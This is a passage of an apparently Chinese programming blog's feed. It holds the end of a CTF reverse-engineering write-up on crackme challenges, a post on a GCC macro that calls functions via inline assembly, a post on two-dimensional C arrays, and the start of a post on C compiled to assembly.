*(&amp;asc_601060[<span class="number">8</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)y] + x) != <span class="string">'#'</span> )  <span class="comment">// 最后要以 # 为终点，否则 wrong</span></span><br><span class="line">    <span class="keyword">goto</span> wrong_and_exit_2;</span><br><span class="line">  msg = <span class="string">"Congratulations!"</span>;</span><br><span class="line">show_msg_and_exit:</span><br><span class="line">  <span class="built_in">puts</span>(msg);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 综上，就是走迷宫，从 (0, 0) 走到 # 处即为 flag</span></span><br></pre></td></tr></table></figure><h2 id="WxyVM2"><a href="#WxyVM2" class="headerlink" title="WxyVM2"></a>WxyVM2</h2><p>丢进 IDA，发现 <code>Sorry, this node is too big to display</code>，顿时觉得水深[一脸黑线]。我不管！读汇编好费时的！F5 之后放一边，居然被我等来了 C 代码，哈哈哈，那就继续分析。</p><p>一看发现两万多行，emmm，先读下头尾。很简单，<code>scanf</code> 到 <code>0x694100</code> 处，一番操作后与 <code>0x6940600</code> 进行比对而已（依旧是那个 <code>byte</code> 与 <code>dword</code> 比对的坑，小心）。所以我就去头去尾，把代码丢 Sublime 里分析了。</p><p>看了一会，发现了猫腻：</p><p><code>scanf</code> 放进去那个 <code>buffer</code> 的范围是 <code>0x694100 ~ 0x694118</code>，最终比对的目标是 <code>0x694060 ~ 0x6940C0</code>，而且后者的数据没变过。又发现中间那两万多行很多跟解题无关，就把对无关地址的操作全剔除了，剩下两千多行有效操作。</p><p>然后思路就很清晰了，反向操作即可。先写个 py 脚本逆一下操作顺序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">l = [i <span class="keyword">for</span> i <span class="keyword">in</span> open(<span class="string">'operations.txt'</span>)]</span><br><span class="line">f = open(<span class="string">'operations-reversed.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> reversed(l):</span><br><span class="line">    f.write(i)</span><br><span class="line">f.close()</span><br><span class="line"><span class="comment"># 没有 close() 至少也 flush() 一下…刚开始这里忘了，卡了很久，很奇怪为啥数据少了一小部分…</span></span><br></pre></td></tr></table></figure><p>然后在 Sublime 里把 <code>--</code> 换成 <code>-= 1</code>，<code>++</code> 同理。再写个很丑的正则替换一下各个操作：<code>(\w+)_(\w+) \+= (.*?);</code> to <code>$1(0x$2) -= $3</code>;，这里是加法变减法，其他同理。</p><p>由于看起来很可能会有溢出，我就直接用 C 写了，省得像之前那样活生生地在 py 里模拟溢出…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> goal[<span class="number">25</span>] = &#123;</span><br><span class="line">    <span class="number">0xC0</span>, <span class="number">0x85</span>, <span class="number">0xF9</span>, <span class="number">0x6C</span>, <span class="number">0xE2</span>, <span class="number">0x14</span>, <span class="number">0xBB</span>, <span class="number">0xE4</span>, <span class="number">0x0D</span>,</span><br><span class="line">    <span class="number">0x59</span>, <span class="number">0x1C</span>, <span class="number">0x23</span>, <span class="number">0x88</span>, <span class="number">0x6E</span>, <span class="number">0x9B</span>, <span class="number">0xCA</span>, <span class="number">0xBA</span>, <span class="number">0x5C</span>,</span><br><span class="line">    <span class="number">0x37</span>, <span class="number">0xFF</span>, <span class="number">0x48</span>, <span class="number">0xD8</span>, <span class="number">0x1F</span>, <span class="number">0xAB</span>, <span class="number">0xA5</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> byte(i) goal[i-0x694100]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 这里放上边得到的逆操作们</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">25</span>; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>, goal[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>Over，至此南邮的训练平台逆向入门题 All Clear~</p><p>Here are two useful pages:</p><ol><li><a href="https://www.cnblogs.com/ljtknowns/p/5741341.html" target="_blank" rel="noopener">汇编指令缩写, ljtcnblogs</a></li><li><a href="http://blog.csdn.net/huiguixian/article/details/52026710" target="_blank" rel="noopener">IDA逆向常用宏定义, 小小攻城师</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;共三道题，前边几道题比较简单，就不写 writeup 了。&lt;/p&gt;
&lt;h2 id=&quot;WxyVM&quot;&gt;&lt;a href=&quot;#WxyVM&quot; class=&quot;headerlink&quot; title=&quot;WxyVM&quot;&gt;&lt;/a&gt;WxyVM&lt;/h2&gt;&lt;p&gt;二话不说拖进 IDA，找到 &lt;code&gt;m
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://oyiadin.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://oyiadin.github.io/tags/writeup/"/>
    
      <category term="Reverse" scheme="http://oyiadin.github.io/tags/Reverse/"/>
    
      <category term="南邮CTF" scheme="http://oyiadin.github.io/tags/%E5%8D%97%E9%82%AECTF/"/>
    
  </entry>
  
  <entry>
    <title>能调用任意函数的函数</title>
    <link href="http://oyiadin.github.io/2018/a-call-any-function/"/>
    <id>http://oyiadin.github.io/2018/a-call-any-function/</id>
    <published>2018-01-25T16:00:00.000Z</published>
    <updated>2018-02-14T12:13:21.862Z</updated>
    
    <content type="html"><![CDATA[<p>其实这是某社团第三次 C 语言作业中一道附加题，当时一看到题目就觉得很有趣，花了一个下午研究了函数调用栈，内嵌汇编的知识，当晚给做了出来。能跑，但是没有解决函数的返回类型这个问题。</p><p>这几天接触宏函数接触得比较多，尝试着实现了一个没用的伪泛型宏函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> declare_function(type, function_name, ...) \</span></span><br><span class="line">    type function_name ## _ #<span class="meta"># type(__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line">declare_function(<span class="keyword">int</span>, my_f, <span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[]) &#123;</span><br><span class="line">    <span class="keyword">return</span> call(...);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上边这段代码会被展开成为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_f_int</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> call(...);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原本按照我的设想，通过临时定义一个函数就可以让用户指定返回类型了，虽然多次调用会使函数重名，但至少离目标更近了一步。但是等到 gcc 报错我才意识到，函数不能嵌套定义…</p><p>所以又停滞了好几天，直到我看到一个用 gcc 特性实现的 lambda 宏函数，这件事才终于得到解决。虽然并非标准 C，但在这过程中已经学到够多了，心满意足。</p><p>Talk is cheap, here is my code :)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> lambda(type, function_body) \</span></span><br><span class="line">    (&#123; type fn function_body fn; &#125;)</span><br><span class="line"><span class="comment">// usage: lambda(int, (int a, int b) &#123; return a+b; &#125;)(2, 3) == 5</span></span><br><span class="line"><span class="comment">// 涉及的第一个特性叫 Statement Expression [1]</span></span><br><span class="line"><span class="comment">// 由括号包裹起来的代码可以有自己的循环、分支甚至是局部变量</span></span><br><span class="line"><span class="comment">// 考虑到这里涉及的代码不止一行，所以用花括号包裹起来(这一项是标准 C)</span></span><br><span class="line"><span class="comment">// 最后一行代码将成为整个 Statement Expression 的值</span></span><br><span class="line"><span class="comment">// 展开得到：</span></span><br><span class="line"><span class="comment">// (&#123;</span></span><br><span class="line"><span class="comment">//   int fn (int a, int b) &#123; return a+b; &#125;</span></span><br><span class="line"><span class="comment">//   fn;</span></span><br><span class="line"><span class="comment">// &#125;) (2, 3);</span></span><br><span class="line"><span class="comment">// 首先在 Statement Expression 中定义了一个局部函数，然后返回这个函数并调用</span></span><br><span class="line"><span class="comment">// 涉及到第二个特性叫 Nested Functions，可以在函数内定义函数 [2]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> call(type, f, ...)              \ <span class="comment">// 变参宏，C99</span></span></span><br><span class="line">    lambda(type, (<span class="keyword">void</span>(*pf)(), ...) &#123;   \ <span class="comment">// 传递的参数无需做处理，告诉编译器需要变参支持即可</span></span><br><span class="line">        <span class="keyword">int</span> return_to;                  \ <span class="comment">// 储存调用点下一行指令的地址</span></span><br><span class="line">        __asm__ __volatile__ (          \ <span class="comment">// 内嵌汇编</span></span><br><span class="line">                                        \ <span class="comment">// 此时栈已经被清空重设，需要恢复未调用时的状态</span></span><br><span class="line">            <span class="string">"movl %%ebp, %%esp;"</span>        \ <span class="comment">// 恢复栈顶</span></span><br><span class="line">            <span class="string">"movl (%%esp), %%ebp;"</span>      \ <span class="comment">// 恢复栈基</span></span><br><span class="line">            <span class="string">"movl 4(%%esp), %0;"</span>        \ <span class="comment">// 保存回溯点</span></span><br><span class="line">            <span class="string">"movl %0, 8(%%esp);"</span>        \ <span class="comment">// 回溯点往上挪，覆盖掉传进来的第一个参数(pf)</span></span><br><span class="line">            <span class="string">"addl $8, %%esp;"</span>           \ <span class="comment">// 使栈顶所指符合stdcall约定</span></span><br><span class="line">                                        \ <span class="comment">// 栈状态已经伪装完毕，仿佛未曾来过此地</span></span><br><span class="line">                                        \ <span class="comment">// 覆盖掉了 pf 这个额外的参数，其他参数原样扔给被调用函数</span></span><br><span class="line">            <span class="string">"jmp *%1;"</span>                  \ <span class="comment">// 正式跳到被调用函数</span></span><br><span class="line">            : <span class="string">"=&amp;r"</span> (return_to)         \</span><br><span class="line">            : <span class="string">"nr"</span> (*pf));              \</span><br><span class="line">    &#125;)((<span class="keyword">void</span>(*)()) f, __VA_ARGS__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Returned: %d\n"</span>, call(<span class="keyword">int</span>, sum, <span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>P.S. 有个简单粗暴的完美解决方法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> call(function_name, ...) function_name(__VA_ARGS__)</span></span><br></pre></td></tr></table></figure><p>不过看起来总觉得不够 Geek，是吧…</p><hr><p>Reference:</p><ol><li><a href="https://gcc.gnu.org/onlinedocs/gcc/Statement-Exprs.html" target="_blank" rel="noopener">Statement Expression, GCC Manual</a></li><li><a href="https://gcc.gnu.org/onlinedocs/gcc/Nested-Functions.html" target="_blank" rel="noopener">Nested Function, GCC Manual</a></li><li><a href="https://gcc.gnu.org/onlinedocs/gcc/Variadic-Macros.html#Variadic-Macros" target="_blank" rel="noopener">Macros with a Variable Number of Arguments, GCC Manual</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;其实这是某社团第三次 C 语言作业中一道附加题，当时一看到题目就觉得很有趣，花了一个下午研究了函数调用栈，内嵌汇编的知识，当晚给做了出来。能跑，但是没有解决函数的返回类型这个问题。&lt;/p&gt;
&lt;p&gt;这几天接触宏函数接触得比较多，尝试着实现了一个没用的伪泛型宏函数：&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="C" scheme="http://oyiadin.github.io/tags/C/"/>
    
      <category term="ASM" scheme="http://oyiadin.github.io/tags/ASM/"/>
    
      <category term="宏" scheme="http://oyiadin.github.io/tags/%E5%AE%8F/"/>
    
  </entry>
  
  <entry>
    <title>C 中二维数组之我的理解</title>
    <link href="http://oyiadin.github.io/2017/2-dimension-array-in-c/"/>
    <id>http://oyiadin.github.io/2017/2-dimension-array-in-c/</id>
    <published>2017-12-14T16:00:00.000Z</published>
    <updated>2018-02-14T12:12:21.602Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//void f(double []);   // double[] 等价于 double*，但如果是多维数组，只能省略第一维</span></span><br><span class="line"><span class="comment">//void f(double **);   // double[][4] 不与 double** 等价，因为第二维度不可省略</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">double</span> [][<span class="number">4</span>])</span></span>;  <span class="comment">// double(*)[4] 与 double[][4] 等价</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> a[<span class="number">3</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">3</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;<span class="number">4</span>; ++j) &#123;</span><br><span class="line">            a[i][j] = i+j/<span class="number">10.0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[%d, %d] =&gt; %.1lf\n"</span>, i, j, a[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Output:</span></span><br><span class="line">    <span class="comment">// [0, 0] =&gt; 0.0</span></span><br><span class="line">    <span class="comment">// [0, 1] =&gt; 0.1</span></span><br><span class="line">    <span class="comment">// [0, 2] =&gt; 0.2</span></span><br><span class="line">    <span class="comment">// [0, 3] =&gt; 0.3</span></span><br><span class="line">    <span class="comment">// [1, 0] =&gt; 1.0</span></span><br><span class="line">    <span class="comment">// [1, 1] =&gt; 1.1</span></span><br><span class="line">    <span class="comment">// [1, 2] =&gt; 1.2</span></span><br><span class="line">    <span class="comment">// [1, 3] =&gt; 1.3</span></span><br><span class="line">    <span class="comment">// [2, 0] =&gt; 2.0</span></span><br><span class="line">    <span class="comment">// [2, 1] =&gt; 2.1</span></span><br><span class="line">    <span class="comment">// [2, 2] =&gt; 2.2</span></span><br><span class="line">    <span class="comment">// [2, 3] =&gt; 2.3</span></span><br><span class="line"></span><br><span class="line">    f(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void f(double (*a)[4]) &#123;</span><br><span class="line">    <span class="comment">// a 是一个指针，指向的数据类型为“double [4]”</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d %d %d\n%d %d %d\n"</span>, <span class="keyword">sizeof</span>(a), <span class="keyword">sizeof</span>(a[<span class="number">0</span>]), <span class="keyword">sizeof</span>(a[<span class="number">0</span>][<span class="number">0</span>]),</span><br><span class="line">        <span class="comment">// 指针(一般)为 int，所以 4</span></span><br><span class="line">        <span class="comment">// 将 a 视作数组，取得第一个元素（类型为 double [4]），</span></span><br><span class="line">        <span class="comment">// 所以 sizeof(double)*4 = 32</span></span><br><span class="line">        <span class="comment">// a[0] 取得类型为 double [4] 的元素，对这个元素再次取下标，得到 double</span></span><br><span class="line">        <span class="keyword">sizeof</span>(<span class="keyword">double</span>), <span class="keyword">sizeof</span>(<span class="keyword">double</span>*), <span class="keyword">sizeof</span>(<span class="keyword">double</span>**));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Output:</span></span><br><span class="line">    <span class="comment">// 8 32 8</span></span><br><span class="line">    <span class="comment">// 8 8 8</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 阅读下文时，时刻记得，在内存中，这段数组不会额外储存任何指针</span></span><br><span class="line">    <span class="comment">// 真实情况是只有 3*4 个 double 型的数据紧密排列</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">12</span>; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[%4d] =&gt; %.1lf\n"</span>, i,    ( *a       ) [i]             );</span><br><span class="line">        <span class="comment">// *a 得到 double [4]，取下标可得 double，</span></span><br><span class="line">        <span class="comment">// 此例说明二维数组数据也是紧凑地并排放置</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Output:</span></span><br><span class="line">        <span class="comment">// [   0] =&gt; 0.0</span></span><br><span class="line">        <span class="comment">// [   1] =&gt; 0.1</span></span><br><span class="line">        <span class="comment">// [   2] =&gt; 0.2</span></span><br><span class="line">        <span class="comment">// [   3] =&gt; 0.3</span></span><br><span class="line">        <span class="comment">// [   4] =&gt; 1.0</span></span><br><span class="line">        <span class="comment">// [   5] =&gt; 1.1</span></span><br><span class="line">        <span class="comment">// [   6] =&gt; 1.2</span></span><br><span class="line">        <span class="comment">// [   7] =&gt; 1.3</span></span><br><span class="line">        <span class="comment">// [   8] =&gt; 2.0</span></span><br><span class="line">        <span class="comment">// [   9] =&gt; 2.1</span></span><br><span class="line">        <span class="comment">// [  10] =&gt; 2.2</span></span><br><span class="line">        <span class="comment">// [  11] =&gt; 2.3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[%4d] =&gt; %.1lf\n"</span>, i,    ( *(a + <span class="number">1</span>) ) [i]             );</span><br><span class="line">        <span class="comment">// a+1 (类型依旧是指向 double[4] 的指针）指向将 a 视为数组的下一个元素，</span></span><br><span class="line">        <span class="comment">// 即跳过了第一个 double[4]</span></span><br><span class="line">        <span class="comment">// 然后解引用得到第二个 double[4]，再取下标，得到第二行开始的各个 double</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Output:</span></span><br><span class="line">        <span class="comment">// [   0] =&gt; 1.0</span></span><br><span class="line">        <span class="comment">// [   1] =&gt; 1.1</span></span><br><span class="line">        <span class="comment">// [   2] =&gt; 1.2</span></span><br><span class="line">        <span class="comment">// [   3] =&gt; 1.3</span></span><br><span class="line">        <span class="comment">// [   4] =&gt; 2.0</span></span><br><span class="line">        <span class="comment">// [   5] =&gt; 2.1</span></span><br><span class="line">        <span class="comment">// [   6] =&gt; 2.2</span></span><br><span class="line">        <span class="comment">// [   7] =&gt; 2.3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[%4d] =&gt; %.1lf\n"</span>, i,    ( (<span class="keyword">double</span> *) a   + <span class="number">1</span> ) [i]   );</span><br><span class="line">        <span class="comment">// 先让 a 的类型从 double(*)[4] 变为 double(*)</span></span><br><span class="line">        <span class="comment">// 通过强制转换，我们故意让类型系统丢失了 a 的二维维度这个信息</span></span><br><span class="line">        <span class="comment">// 现在可以看成：a 是一个指针，但指向的数据类型不再是“double [4]”</span></span><br><span class="line">        <span class="comment">// 而是“double”（丢了维度信息）</span></span><br><span class="line">        <span class="comment">// 现在，double* 型的 a+1 不再是指向下一个 double[4]，</span></span><br><span class="line">        <span class="comment">// 而是指向往后跳过一个 double 的内存处</span></span><br><span class="line">        <span class="comment">// 接着，将 a+1 这个指针视作数组，取下标得到 double</span></span><br><span class="line">        <span class="comment">// 可以发现，这一次跳过的不是一行，而是一个元素(一个 double)</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Output:</span></span><br><span class="line">        <span class="comment">// [   0] =&gt; 0.1</span></span><br><span class="line">        <span class="comment">// [   1] =&gt; 0.2</span></span><br><span class="line">        <span class="comment">// [   2] =&gt; 0.3</span></span><br><span class="line">        <span class="comment">// [   3] =&gt; 1.0</span></span><br><span class="line">        <span class="comment">// [   4] =&gt; 1.1</span></span><br><span class="line">        <span class="comment">// [   5] =&gt; 1.2</span></span><br><span class="line">        <span class="comment">// [   6] =&gt; 1.3</span></span><br><span class="line">        <span class="comment">// [   7] =&gt; 2.0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 综上，通过实验可得到以下结论：</span></span><br><span class="line">    <span class="comment">// 1. 二维数组在内存里依旧是线性储存，前行尾与后行首是完全紧挨着的</span></span><br><span class="line">    <span class="comment">// 2. 在传递参数的过程中，因为编译器会自动解开第一层数组，转换成指针</span></span><br><span class="line">    <span class="comment">//    本来就已经丢失第一维的长度了，所以函数原型可忽略第一维度</span></span><br><span class="line">    <span class="comment">//    但不可忽略后续维度</span></span><br><span class="line">    <span class="comment">// 3. 对于编译器，指针指向的类型十分重要</span></span><br><span class="line">    <span class="comment">//    知道了指针指向什么数据才可以对其进行 +1、解引用等操作</span></span><br><span class="line">    <span class="comment">// 4. 二维数组本质依旧是一维数组，只是指向的数据是另外的数组</span></span><br><span class="line">    <span class="comment">//    二维数组的第二层维度一旦被强制去除，将表现出与一维数组类似的行为</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li
      
    
    </summary>
    
    
      <category term="C" scheme="http://oyiadin.github.io/tags/C/"/>
    
      <category term="数组" scheme="http://oyiadin.github.io/tags/%E6%95%B0%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>HelloWorld：从 C 到 ASM 之旅</title>
    <link href="http://oyiadin.github.io/2017/a-asm-helloworld-generated-from-c/"/>
    <id>http://oyiadin.github.io/2017/a-asm-helloworld-generated-from-c/</id>
    <published>2017-12-11T16:00:00.000Z</published>
    <updated>2018-02-14T12:12:59.032Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* filename: helloworld.c */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hello</span><span class="params">(<span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Received: %d\n"</span>, b);</span><br><span class="line">    <span class="keyword">return</span> b+<span class="number">333</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">111</span>, b=<span class="number">222</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Passing arguments: %d, %d\n"</span>, a, b);</span><br><span class="line">    ++a;</span><br><span class="line">    <span class="keyword">int</span> c = hello(b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">444</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 